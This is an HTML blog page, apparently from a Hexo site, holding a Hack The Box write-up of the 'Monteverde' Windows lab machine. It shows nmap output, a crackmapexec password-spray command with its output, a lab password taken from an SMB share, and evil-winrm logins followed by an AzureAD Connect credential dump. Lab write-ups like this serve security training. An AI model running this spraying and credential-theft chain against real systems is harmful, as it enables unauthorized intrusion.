@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="K3nX">
+
+
+
+
+
+<title> Monteverde </title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+
+    <link rel="stylesheet" href="/css/style.css">
+
+
+
+
+    <!-- scripts list from _config.yml -->
+
+    <script src="/js/script.js"></script>
+
+    <script src="/js/tocbot.min.js"></script>
+
+
+
+
+
+
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">K3nX</a></div>
+            <div class="menu navbar-right">
+
+                    <a class="menu-item" href="/archives">Posts</a>
+
+                    <a class="menu-item" href="/category">Categories</a>
+
+                    <a class="menu-item" href="/tag">Tags</a>
+
+
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">K3nX</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+
+                    <a class="menu-item" href="/archives">Posts</a>
+
+                    <a class="menu-item" href="/category">Categories</a>
+
+                    <a class="menu-item" href="/tag">Tags</a>
+
+
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+
+
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+
+
+
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title"> Monteverde </h1>
+
+                <div class="post-meta">
+
+
+
+
+                        <span class="post-category">
+                    Category:
+
+                                <a href="/categories/Hackthebox/">Hackthebox</a>
+
+                        </span>
+
+                </div>
+
+        </header>
+
+        <div class="post-content">
+            <h3 id="Monteverde"><a href="#Monteverde" class="headerlink" title="Monteverde"></a>Monteverde - K3nX </h3><ul>
+<li>This Machine Name is Monteverde . This is Window Machine and ipaddress is 10.10.10.172 <br><img src="infocard.png" alt="Sample Image"></li>
+</ul>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre>
+<code class="bash"># cat monteverde.nmap
+Nmap scan report for 10.10.10.172
+Host is up (0.55s latency).
+Not shown: 65516 filtered ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    bind
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-03 14:16:26Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  msrpc         Microsoft Windows RPC
+49703/tcp open  msrpc         Microsoft Windows RPC
+49775/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=4/3%Time=5E8750B8%P=x86_64-pc-linux-gnu%r(DNSVe
+SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
+SF:04bind\0\0\x10\0\x03");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -48m59s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-04-03T14:19:25
+|_  start_date: N/A
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT       ADDRESS
+1   459.75 ms 10.10.16.1
+2   665.28 ms 10.10.10.172
+</code></pre>
+<p>As nmap result , some common AD port are open also smb port . So Let's check to SMB</p>
+<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><ul>
+<li><p>I used enum4linux to get more information . After running I got some username in output <br><img src="enum.png" alt="Sample Image"></p>
+</li>
+<li><p>I save all of this username into one file and i give this file name as users.txt.</p>
+</li>
+<li><p>I tried to find some valid credentials using this username list also as passwords: </p>
+<pre><code class="bash"># crackmapexec smb 10.10.10.172 -u users.txt -p users.txt
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating default workspace
+[*] Initializing SMB protocol database
+[*] Initializing SSH protocol database
+[*] Initializing MSSQL protocol database
+[*] Initializing HTTP protocol database
+[*] Initializing WINRM protocol database
+[*] Copying default configuration file
+[*] Generating SSL certificate
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:Administrator STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:krbtgt STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:mhope STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:svc-ata STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:dgalanos STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:roleary STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:smorgan STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator: STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:Administrator STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:krbtgt STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:mhope STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:svc-ata STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:dgalanos STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:roleary STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:smorgan STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt: STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:Administrator STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:krbtgt STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2: STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:Administrator STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:krbtgt STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:mhope STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:SABatchJobs STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-ata STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-bexec STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:svc-netapp STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:dgalanos STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:roleary STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:smorgan STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope: STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:Administrator STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:krbtgt STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:mhope STATUS_LOGON_FAILURE
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
+</code></pre>
+</li>
+<li><p>I found one valid credential .This is MEGABANK\SABatchJobs:SABatchJobs </p>
+</li>
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3>
+<li><p>I tried to get a list of shares available on this machine <br><img src="smblist.png" alt="Sample Image"></p>
+</li>
+<li><p>I found users and azure_upload share in this smb <br> I login into this smb and checked this users directory <br><img src="smblogin.png" alt="Sample Image"></p>
+</li>
+<li><p>I found some user directory in this share , First i check into dgalanos dir but i found nothing<br><img src="smbdgalanos.png" alt="Sample Image"></p>
+</li>
+<li><p>I check mhope directroy . I found one interesting file in this dir,(azure.xml) <br><img src="smbmhope.png" alt="Sample Image"></p>
+</li>
+<li><p>I downloaded this file into my local and I check this file<br>I found one possible password in this xml file.<br>I think , this file is located in mhope directroy . So, this password may be mhope password . It may be but not sure<br><img src="azure.png" alt="Sample Image"></p>
+</li>
+<li><p>I used evil-winrm to login user mhope password is 4n0therD4y@n0th3r$</p>
+</li>
+<li><p>Luckily  I can login with this password , I got useraccess and user flag <br><img src="user.png" alt="Sample Image"></p>
+</li>
+</ul>
+<h3 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h3><ul>
+<li>I used whoami /all command to take a look to the privileges of this user</li>
+<li><p>I found this user is a member of a group of Azure Admin<br><img src="whoami.png" alt="Sample Image"></p></li>
+<li>Which means , I found about this on google , It is like DCSync <br> In this time I found one useful link and In this link contain poc script <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/"> Resource </a></li>
+</ul>
+<ul>
+<li><p>Download this script , I modified a few and upload this into attacking machine. And execute this</p>
+</li>
+<li><p>I got administrator password<br><img src="admincred.png" alt="Sample Image"></p>
+</li>
+</ul>
+<ul>
+<li>I used evil-winrm again to login as administrator </li>
+<img src="root.png" alt="Sample Image">
+<li>Login Successful and I got administrator access </li>
+<b><li>Finally I got root flag and owned this machine<br>thank you so much for spending your valuable time on my writeup<br> I hope you enjoy this</li><b>
+</ul>
+        </div>
+
+
+            <section class="post-copyright">
+
+
+
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyrigh K3nX (c) 2019</span>
+                    </p>
+
+
+
+            </section>
+
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+
+
+                        <a href="/tags/Hackthebox/"># Hackthebox</a>
+
+
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+
+        <!--        <a class="prev" rel="prev" href="/2020/04/24/meandmygf/">meandmygf</a>
+
+
+            <a class="next" rel="next" href="/2020/04/24/basic/">Essential Linux Command For Beginner</a>
+	-->
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>©K3nX </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
